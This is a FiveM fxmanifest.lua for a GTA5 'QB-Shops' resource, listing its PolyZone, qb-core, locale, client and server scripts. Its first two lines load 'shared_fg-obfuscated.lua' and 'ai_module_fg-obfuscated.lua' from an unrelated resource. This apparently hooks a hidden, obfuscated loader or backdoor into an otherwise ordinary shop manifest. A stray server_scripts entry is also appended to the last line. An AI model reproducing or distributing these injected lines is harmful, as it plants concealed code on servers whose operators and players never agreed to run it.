shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

fx_version 'cerulean'
game 'gta5'
description 'QB-Shops'
version '1.2.0'
shared_scripts {
    '@PolyZone/client.lua',
    '@PolyZone/BoxZone.lua',
    '@PolyZone/EntityZone.lua',
    '@PolyZone/CircleZone.lua',
    '@PolyZone/ComboZone.lua',
    '@qb-core/shared/locale.lua',
    'locale/en.lua',
    'locale/*.lua',
    'config.lua'
}
client_script 'client/main.lua'
server_script 'server/main.lua'
file 'json/shops-inventory.json'
lua54 'yes'server_scripts { '@mysql-async/lib/MySQL.lua' }